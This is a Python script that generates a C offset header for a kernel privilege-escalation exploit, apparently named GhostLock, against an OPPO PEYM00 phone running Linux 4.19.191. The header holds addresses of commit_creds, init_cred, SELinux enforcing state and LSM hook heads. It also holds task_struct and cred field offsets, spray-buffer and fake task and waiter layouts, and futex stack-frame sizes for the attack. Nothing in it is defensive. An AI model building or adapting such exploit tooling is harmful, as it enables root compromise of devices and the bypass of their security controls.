# -*- coding: utf-8 -*-
"""gen_target.py — 从零生成 PEYM00 / MT6893 / 4.19.191 完整设备偏移表。

数据来源（全部本地，可复核）：
  vmlinux.elf / vmlinux.bin   静态 ELF + 内嵌 __ksymtab
  ksymtab.json                ksymtab.py 还原的 12649 条导出符号（自校验 94.1%）
  device-config.txt           设备 /proc/config.gz 解出的编译配置
  device-getprop.txt          设备指纹
  OPPO_...-boot.img           boot header v2 的 kernel_addr
  _dis_*.txt / _pin*.txt / _fields2.txt  反汇编留档

所有 OFF = vaddr - KIMAGE_TEXT_BASE，由 Python 计算，禁止手算。
输出 target-PEYM00.h（编译用）与 offsets-PEYM00.h（同内容，兼容旧引用）。
"""
import sys, io, json, os, struct, re
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
from kelf import KernelELF
import paths

HERE = os.path.dirname(os.path.abspath(__file__))
os.chdir(HERE)
k = KernelELF()
BASE = k.phdrs[0]["vaddr"]
assert BASE == 0xffffff8008080000, hex(BASE)
KT = json.load(open(paths.ipath("ksymtab.json"), encoding="utf-8"))
CFG = open(paths.ipath("device-config.txt"), encoding="utf-8", errors="replace").read()
GP = open(paths.ipath("device-getprop.txt"), encoding="utf-8", errors="replace").read()


def cfg(key, default=None):
    m = re.search(r"^CONFIG_%s=(.*)$" % re.escape(key), CFG, re.M)
    return m.group(1).strip().strip('"') if m else default


def prop(key, default=""):
    m = re.search(r"\[%s\]: \[([^\]]*)\]" % re.escape(key), GP)
    return m.group(1) if m else default


def off(va):
    return va - BASE


# ---------------------------------------------------------------- 函数符号
FN = {
    "ASHMEM_IOCTL_OFF": "ashmem_ioctl",
    "ASHMEM_COMPAT_IOCTL_OFF": "compat_ashmem_ioctl",
    "ASHMEM_MMAP_OFF": "ashmem_mmap",
    "ASHMEM_OPEN_OFF": "ashmem_open",
    "ASHMEM_RELEASE_OFF": "ashmem_release",
    "ASHMEM_SHOW_FDINFO_OFF": "ashmem_show_fdinfo",
    "ASHMEM_LLSEEK_OFF": "ashmem_llseek",
    "CONFIGFS_READ_ITER_OFF": "configfs_read_file",
    "CONFIGFS_BIN_WRITE_ITER_OFF": "configfs_write_bin_file",
    "COPY_SPLICE_READ_OFF": "generic_file_splice_read",
    "NOOP_LLSEEK_OFF": "noop_llseek",
    "CALL_USERMODEHELPER_EXEC_WORK_OFF": "call_usermodehelper_exec_work",
    "CAP_CAPABLE_OFF": "cap_capable",
    "DO_FUTEX_OFF": "do_futex",
    "REMOVE_WAITER_OFF": "remove_waiter",
    "RT_MUTEX_START_PROXY_LOCK_OFF": "rt_mutex_start_proxy_lock",
    "COMMIT_CREDS_OFF": "commit_creds",
    "CORE_SYS_SELECT_OFF": "core_sys_select",
    "SYS_PSELECT6_OFF": "__arm64_sys_pselect6",
    "SYS_FUTEX_OFF": "__arm64_sys_futex",
}
FNO = {}
for macro, name in FN.items():
    a = k.sym(name)
    assert a, "缺失函数符号 " + name
    FNO[macro] = off(a)

# ---------------------------------------------------------------- 数据符号
# [A1] __ksymtab 直接导出（ksymtab.py 还原，95% 名称自校验）
EXPORTED = {
    "INIT_TASK_OFF": "init_task",
    "INIT_UTS_NS_OFF": "init_uts_ns",
    "EMPTY_ZERO_PAGE_OFF": "empty_zero_page",
    "SYSTEM_UNBOUND_WQ_OFF": "system_unbound_wq",
    "SYSTEM_WQ_OFF": "system_wq",
    "SYSTEM_LONG_WQ_OFF": "system_long_wq",
    "KMALLOC_CACHES_OFF": "kmalloc_caches",
    "KIMAGE_VADDR_OFF": "kimage_vaddr",
    "KIMAGE_VOFFSET_OFF": "kimage_voffset",
    "MEMSTART_ADDR_OFF": "memstart_addr",
}
# [A2] 反汇编 / 指针表 / ctl_table / init 调用点静态恢复（见报告第十节）
MEASURED = {
    "INIT_CRED_OFF": 0x2199890,          # prepare_kernel_cred ADRP; init_task.real_cred 指回
    "ASHMEM_FOPS_OFF": 0x1aae178,        # fops 指针表
    "ASHMEM_MISC_FOPS_OFF": 0x2461948,   # 唯一指向 ashmem_fops 的槽
    "ANON_PIPE_BUF_OPS_OFF": 0x13682c8,  # confirm/release/steal/get 四连
    "PIPEFIFO_FOPS_OFF": 0x1368310,
    "ROOT_TASK_GROUP_OFF": 0x2554ac0,    # init_tg_cfs_entry 的 x0；init_task+0x340 指回
    "SELINUX_STATE_OFF": 0x2884050,      # sel_fill_super: fsi->state；avc_has_perm x0
    "SELINUX_ENFORCING_OFF": 0x2884051,  # sel_write_enforce: ldrb [state,#1]
    "SECURITY_HOOK_HEADS_OFF": 0x1f760e0,  # 205 条 LSM hook 表项的 head 最小值
    "KPTR_RESTRICT_OFF": 0x218c340,      # ctl_table.procname="kptr_restrict" 的 .data
    "SLIDE_BOOTID_CTLTABLE_OFF": 0x2214ac8,
    "SLIDE_RANDOM_BOOT_ID_DATA_OFF": 0x2926ff4,
}
DATA = {}
for m, n in EXPORTED.items():
    assert n in KT, "ksymtab 缺少导出符号 " + n
    DATA[m] = KT[n]
for m, v in MEASURED.items():
    DATA[m] = v
# 别名（上游兼容）
DATA["SLIDE_SYSCTL_BOOTID_OFF"] = DATA["SLIDE_BOOTID_CTLTABLE_OFF"]
DATA["SLIDE_INIT_TASK_OFF"] = DATA["INIT_TASK_OFF"]
DATA["SLIDE_ROOT_TASK_GROUP_OFF"] = DATA["ROOT_TASK_GROUP_OFF"]

DATA_WHY = {
    "INIT_TASK_OFF": "ksymtab; comm=swapper pid=0 real_parent=self real_cred=init_cred 验证",
    "INIT_UTS_NS_OFF": "ksymtab; 内含 Linux/(none)/4.19.191+/#1/aarch64",
    "EMPTY_ZERO_PAGE_OFF": "ksymtab; 恰为 .bss 起点、页对齐 __page_aligned_bss",
    "SYSTEM_UNBOUND_WQ_OFF": "ksymtab（旧表误填 0x217db40，实为 cpumask 位图）",
    "SYSTEM_WQ_OFF": "ksymtab",
    "SYSTEM_LONG_WQ_OFF": "ksymtab",
    "KMALLOC_CACHES_OFF": "ksymtab + create_kmalloc_caches 数组基址（旧值 0x217db40 错）",
    "KIMAGE_VADDR_OFF": "ksymtab; 静态值 0xffffff8008000000 = KIMAGE_VADDR",
    "KIMAGE_VOFFSET_OFF": "ksymtab; 启动时填充，物理读可反推 KASLR slide",
    "MEMSTART_ADDR_OFF": "ksymtab",
    "INIT_CRED_OFF": "prepare_kernel_cred ADRP+ADD；init_task+0x760/0x768 双向验证",
    "ASHMEM_FOPS_OFF": "镜像内 fops 指针表槽位逐项吻合",
    "ASHMEM_MISC_FOPS_OFF": "唯一指向 ashmem_fops 的数据槽 = miscdevice.fops",
    "ANON_PIPE_BUF_OPS_OFF": "四连函数指针表",
    "PIPEFIFO_FOPS_OFF": "no_llseek/pipe_read/pipe_write/ioctl/open/release",
    "ROOT_TASK_GROUP_OFF": "sched_init 传给 init_tg_cfs_entry 的 x0 = 0xa5d4ac0",
    "SELINUX_STATE_OFF": "sel_fill_super: stp x9,x19,[fsi,#0x70]，x9=0xa904050",
    "SELINUX_ENFORCING_OFF": "sel_write_enforce: ldrb w22,[x21,#1]（disabled@0, enforcing@1）",
    "SECURITY_HOOK_HEADS_OFF": "capability(18)+selinux(187) 共 205 条 hook 项，192 个 head，跨 0x618",
    "KPTR_RESTRICT_OFF": "ctl_table @0x2196e30 的 .data 槽，maxlen=4",
    "SLIDE_BOOTID_CTLTABLE_OFF": "ctl_table.procname='boot_id'",
    "SLIDE_RANDOM_BOOT_ID_DATA_OFF": "boot_id ctl_table 的 .data 槽（proc_do_uuid 可读）",
}

# ---------------------------------------------------------------- 地址空间
VA_BITS = int(cfg("ARM64_VA_BITS", "39"))
PAGE_SHIFT = 12
STRUCT_PAGE_SIZE = 0x40
KIMAGE_VADDR = k.u64(BASE + DATA["KIMAGE_VADDR_OFF"])
assert KIMAGE_VADDR == 0xffffff8008000000, hex(KIMAGE_VADDR)
VA_START = KIMAGE_VADDR - 0x8000000                # MODULES_VSIZE = SZ_128M
assert VA_START == (0xffffffffffffffff - (1 << VA_BITS) + 1) & 0xffffffffffffffff
PAGE_OFFSET = (0xffffffffffffffff - (1 << (VA_BITS - 1)) + 1) & 0xffffffffffffffff
VMEMMAP_SIZE = (1 << (VA_BITS - PAGE_SHIFT)) * STRUCT_PAGE_SIZE
VMEMMAP_START = PAGE_OFFSET - VMEMMAP_SIZE
MEMTOTAL_KB = int(re.search(r"MemTotal:\s+(\d+) kB",
                            open(paths.ipath("device-meminfo.txt"), encoding="utf-8", errors="replace").read()).group(1))
DIRECT_MAP_END = PAGE_OFFSET + 0x400000000          # 16GB > MemTotal 11.2GB
BOOT = open(paths.ipath("OPPO_PEYM00_PEYM00_11_F.31-boot.img"), "rb").read(64)
KERNEL_ADDR = struct.unpack_from("<I", BOOT, 0x0c)[0]
HDR_VER = struct.unpack_from("<I", BOOT, 0x28)[0]
assert HDR_VER == 2 and KERNEL_ADDR == 0x40080000
PHYS_OFFSET = 0x40000000

GATES = [
    ("CFG_KALLSYMS", cfg("KALLSYMS")),
    ("CFG_KALLSYMS_ALL", 1 if cfg("KALLSYMS_ALL") else 0),
    ("CFG_KALLSYMS_BASE_RELATIVE", 1 if cfg("KALLSYMS_BASE_RELATIVE") else 0),
    ("CFG_RANDOMIZE_BASE", 1 if cfg("RANDOMIZE_BASE") else 0),
    ("CFG_RELOCATABLE", 1 if cfg("RELOCATABLE") else 0),
    ("CFG_ARM64_VA_BITS", VA_BITS),
    ("CFG_ARM64_PAN", 1 if cfg("ARM64_PAN") else 0),
    ("CFG_ARM64_UAO", 1 if cfg("ARM64_UAO") else 0),
    ("CFG_ARM64_SW_TTBR0_PAN", 1 if cfg("ARM64_SW_TTBR0_PAN") else 0),
    ("CFG_UNMAP_KERNEL_AT_EL0", 1 if cfg("UNMAP_KERNEL_AT_EL0") else 0),
    ("CFG_HARDEN_BRANCH_PREDICTOR", 1 if cfg("HARDEN_BRANCH_PREDICTOR") else 0),
    ("CFG_STRICT_KERNEL_RWX", 1 if cfg("STRICT_KERNEL_RWX") else 0),
    ("CFG_MODULE_SIG_FORCE", 1 if cfg("MODULE_SIG_FORCE") else 0),
    ("CFG_HARDENED_USERCOPY", 1 if cfg("HARDENED_USERCOPY") else 0),
    ("CFG_SLAB_FREELIST_HARDENED", 1 if cfg("SLAB_FREELIST_HARDENED") else 0),
    ("CFG_SLAB_FREELIST_RANDOM", 1 if cfg("SLAB_FREELIST_RANDOM") else 0),
    ("CFG_STATIC_USERMODEHELPER", 1 if cfg("STATIC_USERMODEHELPER") else 0),
    ("CFG_SECURITY_SELINUX", 1 if cfg("SECURITY_SELINUX") else 0),
    ("CFG_SECURITY_SELINUX_DEVELOP", 1 if cfg("SECURITY_SELINUX_DEVELOP") else 0),
    ("CFG_SECCOMP_FILTER", 1 if cfg("SECCOMP_FILTER") else 0),
    ("CFG_USER_NS", 1 if cfg("USER_NS") else 0),
    ("CFG_PROC_KCORE", 1 if cfg("PROC_KCORE") else 0),
    ("CFG_DEBUG_FS", 1 if cfg("DEBUG_FS") else 0),
    ("CFG_KPROBES", 1 if cfg("KPROBES") else 0),
    ("CFG_BPF_SYSCALL", 1 if cfg("BPF_SYSCALL") else 0),
    ("CFG_OPLUS_ROOT_CHECK", 1 if cfg("OPLUS_ROOT_CHECK") else 0),
    ("CFG_OPLUS_EXECVE_BLOCK", 1 if cfg("OPLUS_EXECVE_BLOCK") else 0),
    ("CFG_OPLUS_MOUNT_BLOCK", 1 if cfg("OPLUS_MOUNT_BLOCK") else 0),
    ("CFG_OPLUS_SECURE_GUARD", 1 if cfg("OPLUS_SECURE_GUARD") else 0),
]

# ---------------------------------------------------------------- 结构体常量
STRUCT = """/* ---- rt_mutex_waiter (4.19 compact, size 0x50; 无 wake_state/ww_ctx) ---- */
#define WAITER_LOCAL_OFF            0x80   /* [C] fwrpi 栈上局部区基准（上游 spray 约定） */
#define WAITER_TREE_ENTRY_OFF       0x00
#define WAITER_PI_TREE_ENTRY_OFF    0x18
#define WAITER_TASK_OFF             0x30
#define WAITER_LOCK_OFF             0x38
#define WAITER_PRIO_OFF             0x40
#define WAITER_DEADLINE_OFF         0x48
#define WAITER_STRUCT_SIZE          0x50

/* ---- exploit 内部 spray buffer 布局（与目标内核无关，沿用上游） ---- */
#define LOCK_OFF                    0x1350
#define W0_OFF                      0x2220
#define FOPS_OFF                    0x1000
#define SCRATCH_OFF                 0x3000
#define RIGHT_OFF                   0x4440
#define LEFT_OFF                    0x5550
#define FAKE_TASK_OFF               0x3200
#define FAKE_WAITER_TREE_PRIO_OFF       0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF   0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF            0x50
#define FAKE_WAITER_LOCK_OFF            0x58
#define FAKE_WAITER_WAKE_STATE_OFF      0x60
#define FAKE_WAITER_WW_CTX_OFF          0x68

/* ---- task_struct：全部实测 / 4.19 上游锚定 ----
 * prio@0x88 由 task_prio() 的 `ldr w8,[x0,#0x88]; sub w0,w8,#100` 钉死；
 * static_prio@0x8c 由 set_user_nice 的 `str w8,[p,#0x8c]` 钉死；
 * rt_priority@0x94 / sched_class@0x98 由 __sched_setscheduler 钉死；
 * sched_task_group@0x340 由 init_task 内指向 root_task_group 的指针钉死。
 * 相对 K40 4.19 后半段整差 -0x80，已由 10 个实测字段交叉验证。 */
#define TASK_THREAD_INFO_FLAGS_OFF  0x000
#define TASK_PRIO_OFF               0x088
#define TASK_STATIC_PRIO_OFF        0x08c
#define TASK_NORMAL_PRIO_OFF        0x090
#define TASK_RT_PRIORITY_OFF        0x094
#define TASK_SCHED_CLASS_OFF        0x098
#define TASK_SCHED_TASK_GROUP_OFF   0x340
#define TASK_TASKS_OFF              0x4b8
#define TASK_MM_OFF                 0x508
#define TASK_ATOMIC_FLAGS_OFF       0x580
#define TASK_PID_OFF                0x5b8
#define TASK_TGID_OFF               0x5bc
#define TASK_REAL_PARENT_OFF        0x5c8
#define TASK_THREAD_GROUP_OFF       0x668
#define TASK_REAL_CRED_OFF          0x760
#define TASK_CRED_OFF               0x768
#define TASK_COMM_OFF               0x770
#define TASK_SECCOMP_OFF            0x810
#define TASK_ALLOC_LOCK_OFF         0x830
#define TASK_PI_LOCK_OFF            0x834
#define TASK_PI_WAITERS_OFF         0x840
#define TASK_PI_TOP_TASK_OFF        0x850
#define TASK_PI_BLOCKED_ON_OFF      0x858
#define MM_OWNER_OFF                0x338
#define MM_STRUCT_SIZEOF            0x398  /* [A] proc_caches_init: kmem_cache_create_usercopy("mm_struct",0x398) */
#define MM_STRUCT_SZ                8      /* [C] 上游语义是「扫描步长」，不是 sizeof；勿改 */

/* fake_task 是完整 task_struct 镜像，字段必须用本机真实偏移 */
#define FAKE_TASK_USAGE_OFF             TASK_USAGE_OFF
#define FAKE_TASK_PRIO_OFF              TASK_PRIO_OFF
#define FAKE_TASK_NORMAL_PRIO_OFF       TASK_NORMAL_PRIO_OFF
#define FAKE_TASK_TASK_GROUP_OFF        TASK_SCHED_TASK_GROUP_OFF
#define FAKE_TASK_PI_LOCK_OFF           TASK_PI_LOCK_OFF
#define FAKE_TASK_PI_WAITERS_OFF        TASK_PI_WAITERS_OFF
#define FAKE_TASK_PI_TOP_TASK_OFF       TASK_PI_TOP_TASK_OFF
#define FAKE_TASK_PI_BLOCKED_ON_OFF     TASK_PI_BLOCKED_ON_OFF
#define TASK_USAGE_OFF                  0x010  /* [C] atomic_t usage，紧接 state/stack */

/* ---- cred (4.19, size 0xa8) / seccomp / selinux ---- */
#define CRED_UID_OFF                0x04
#define CRED_SECUREBITS_OFF         0x24
#define CRED_CAPS_OFF               0x28
#define CRED_SECURITY_OFF           0x78
#define CRED_STRUCT_SIZE            0xa8
#define SELINUX_CRED_BLOB_OFF       0
#define SELINUX_CRED_OSID_OFF       0x00
#define SELINUX_CRED_SID_OFF        0x04
#define SECCOMP_MODE_OFF            0x00
#define SECCOMP_FILTER_OFF          0x08
#define TIF_SECCOMP_BIT             11
#define PFA_NO_NEW_PRIVS_BIT        0

/* ---- file_operations (4.19, 两张独立 fops 表交叉验证) ---- */
#define FOPS_OWNER_OFF              0x00
#define FOPS_LLSEEK_OFF             0x08
#define FOPS_READ_OFF               0x10
#define FOPS_WRITE_OFF              0x18
#define FOPS_READ_ITER_OFF          0x20
#define FOPS_WRITE_ITER_OFF         0x28
#define FOPS_POLL_OFF               0x40
#define FOPS_IOCTL_OFF              0x48
#define FOPS_COMPAT_IOCTL_OFF       0x50
#define FOPS_MMAP_OFF               0x58
#define FOPS_OPEN_OFF               0x68
#define FOPS_RELEASE_OFF            0x78
#define FOPS_SPLICE_READ_OFF        0xc0
#define FOPS_SHOW_FDINFO_OFF        0xd8

/* ---- pipe：本机为 4.19 标准 RING 布局（禁用 K40 legacy 适配） ---- */
#define PIPE_BUFFER_SIZE            0x28
#define PIPE_BUFFER_SLOTS           16
#define PIPE_BUF_FLAG_CAN_MERGE     0x10
#define PIPE_INODE_INFO_SIZE        0x90
#define PIPE_INODE_INFO_STRUCT_SIZE 0x90
#define PIPE_MUTEX_OFF              0x00
#define PIPE_WAIT_OFF               0x28
#define PIPE_HEAD_OFF               0x38
#define PIPE_TAIL_OFF               0x3c
#define PIPE_MAX_USAGE_OFF          0x40
#define PIPE_RING_SIZE_OFF          0x44
#define PIPE_READERS_OFF            0x5c
#define PIPE_WRITERS_OFF            0x60
#define PIPE_TMP_PAGE_OFF           0x68
#define PIPE_BUFS_OFF               0x80
#define PIPE_USER_OFF               0x88
#define KMALLOC_PIPE_INDEX          10
#define KMALLOC_PIPE_OBJ_SIZE       0x400
#define KMALLOC_CACHE_TYPES         3

/* ---- struct page / configfs_buffer（4.19 上游稳定） ---- */
#define STRUCT_PAGE_SIZE            0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF       0x18
#define STRUCT_PAGE_TYPE_OFF        0x30
#define CFG_PAGE_OFF                16
#define CFG_NEEDS_READ_FILL_OFF     64
#define CFG_BIN_BUFFER_OFF          72
#define CFG_BIN_BUFFER_SIZE_OFF     80
#define CFG_CB_MAX_SIZE_OFF         84

/* ---- 栈叠加（精确帧，见报告第九节） ---- */
#define FRAME_SYS_FUTEX             0x70
#define FRAME_DO_FUTEX              0x210
#define FRAME_FUTEX_REQUEUE         0x140
#define FRAME_SYS_PSELECT6          0xc0
#define FRAME_SYS_SELECT            0x80
#define FRAME_CORE_SYS_SELECT       0x1c0
#define FRAME_DO_SELECT             0x380
#define FRAME_SYS_PPOLL             0xb0
#define STACK_FDS_SP_OFF            0x50
#define NFDS                        320
#define WAITER_WORD_STATIC_ESTIMATE 19
#define WAITER_WORD_MAX_FEASIBLE    7
#define PSELECT_WAITER_WORD_SHIFT   0
"""

lines = []
A = lines.append
A("/* PEYM00 / MT6893 / Linux 4.19.191+ — GhostLock 完整设备偏移表")
A(" * 由 gen_target.py 从 vmlinux.elf + __ksymtab + /proc/config.gz 生成，勿手改。")
A(" * 置信度: [A] ELF/ksymtab/反汇编实测  [B] 结构规律推定")
A(" *          [C] 4.19 上游稳定布局      [D] 必须上机验证")
A(" * 与上游 ccp-p/...-4.19-k40 的 target.h 宏名对齐，可直接作为 TARGET_CONFIG_H。")
A(" */")
A("#ifndef TARGET_PEYM00_H")
A("#define TARGET_PEYM00_H")
A("")
A('#define BUILD_VARIANT_LABEL "%s"' % "PEYM00_4.19.191_a13")
A("#ifndef BUILD_FINGERPRINT")
A('#define BUILD_FINGERPRINT "%s"' % prop("ro.build.fingerprint", "unknown"))
A("#endif")
A("")
A("/* ---------------- address space ---------------- */")
A("#define KIMAGE_TEXT_BASE        0x%016xULL  /* [A] ELF PH vaddr / _text */" % BASE)
A("#define KIMAGE_VADDR            0x%016xULL  /* [A] kimage_vaddr 静态值 = MODULES_END */" % KIMAGE_VADDR)
A("#define VA_START                0x%016xULL  /* [A] KIMAGE_VADDR - SZ_128M */" % VA_START)
A("#define VA_BITS                 %d" % VA_BITS)
A("#define PAGE_SHIFT              %d" % PAGE_SHIFT)
A("#define P0_PAGE_OFFSET          0x%016xULL  /* [C] VA_BITS=39 公式；旧表 0xffffff8000000000 是 VA_START，错 */" % PAGE_OFFSET)
A("#define KERNELSNITCH_IDENTITY_START 0x%016xULL /* [D] PAGE_OFFSET - 8GB */" % (PAGE_OFFSET - 0x200000000))
A("#define KERNELSNITCH_IDENTITY_END   0x%016xULL /* [D] PAGE_OFFSET + 16GB */" % DIRECT_MAP_END)
A("#define DIRECT_MAP_BASE         0x%016xULL  /* [C] = PAGE_OFFSET */" % PAGE_OFFSET)
A("#define DIRECT_MAP_END          0x%016xULL  /* [C] 16GB 窗口 > MemTotal %d kB */" % (DIRECT_MAP_END, MEMTOTAL_KB))
A("#define VMEMMAP_START           0x%016xULL  /* [C] PAGE_OFFSET - (1<<(VA_BITS-12))*0x40 */" % VMEMMAP_START)
A("#define P0_PHYS_OFFSET          0x%016xULL  /* [D] MT6893 DRAM base */" % PHYS_OFFSET)
A("#define P0_KERNEL_PHYS_LOAD     0x%016xULL  /* [A] boot header v2 kernel_addr @0x0c */" % KERNEL_ADDR)
A("#define PHYS_TO_VIRT_DELTA      0x%016xULL  /* [C] PAGE_OFFSET - PHYS_OFFSET */" % (PAGE_OFFSET - PHYS_OFFSET))
A("")
A("/* ---------------- 内核编译门禁（/proc/config.gz 实读） ---------------- */")
for name, val in GATES:
    A("#define %-32s %s" % (name, val if isinstance(val, int) else ('"%s"' % val)))
A("#define STATIC_USERMODEHELPER_PATH \"%s\"" % cfg("STATIC_USERMODEHELPER_PATH", ""))
A("")
A("/* ---------------- 4.19 adaptation switches ---------------- */")
A("#define CFGOPS_4_19_STYLE       1")
A("#define KMALLOC_419             1")
A("#define ASHMEM_NAME_PREFIX_LEN  0")
A("#define ASHMEM_PREFIX_COUNT     0")
A("#define PIPE_419_RING_LAYOUT    1   /* ⚠️ 不是 K40 的 legacy pipe */")
A("#define SLIDE_WONLY_BOOTID      1")
A("#define SLIDE_LOGGERS_0_1_OFF   0   /* [D] 本机无 nfnetlink_log logger gadget；改用 kimage_voffset 物理读 */")
A("#define SLIDE_NFULNL_LOGGER_OFF 0")
A("")
A("/* ---------------- 函数符号 OFF ---------------- [A] */")
for m in FN:
    A("#define %-34s 0x%08xULL" % (m, FNO[m]))
A("")
A("/* ---------------- 数据符号 OFF ---------------- [A] */")
for m, v in DATA.items():
    why = DATA_WHY.get(m, "上游兼容别名")
    A("#define %-34s 0x%08xULL  /* %s */" % (m, v, why))
A("")
A("/* 上游习惯的绝对地址宏（含 KASLR slide 时须叠加运行时基址） */")
for m in ["INIT_TASK", "INIT_UTS_NS", "EMPTY_ZERO_PAGE", "ROOT_TASK_GROUP",
          "SELINUX_ENFORCING", "SECURITY_HOOK_HEADS", "KMALLOC_CACHES",
          "ANON_PIPE_BUF_OPS", "ASHMEM_FOPS", "ASHMEM_MISC_FOPS", "INIT_CRED",
          "SYSTEM_UNBOUND_WQ", "KPTR_RESTRICT"]:
    A("#define %-34s (KIMAGE_TEXT_BASE + %s_OFF)" % (m, m))
A("")
A(STRUCT)
A("#endif /* TARGET_PEYM00_H */")

body = "\n".join(lines) + "\n"
for name in ["target-PEYM00.h", "offsets-PEYM00.h"]:
    with open(paths.opath(name), "w", encoding="utf-8", newline="\n") as f:
        f.write(body)

# 机器可读清单，供 verify_target.py 校验
macros = {}
for line in body.splitlines():
    mm = re.match(r"^#define\s+(\w+)\s+(0x[0-9a-fA-F]+)ULL", line)
    if mm:
        macros[mm.group(1)] = int(mm.group(2), 16)
with open(paths.opath("offsets-PEYM00.json"), "w", encoding="utf-8") as f:
    json.dump(macros, f, indent=1, sort_keys=True)

print("基址 0x%x  函数 %d  数据 %d  #define %d" % (BASE, len(FNO), len(DATA), body.count("#define")))
print("地址空间: VA_START=0x%x PAGE_OFFSET=0x%x VMEMMAP=0x%x DIRECT_MAP_END=0x%x" %
      (VA_START, PAGE_OFFSET, VMEMMAP_START, DIRECT_MAP_END))
print("boot header v%d: kernel_addr=0x%x  MemTotal=%d kB" % (HDR_VER, KERNEL_ADDR, MEMTOTAL_KB))
print("输出: target-PEYM00.h / offsets-PEYM00.h / offsets-PEYM00.json")
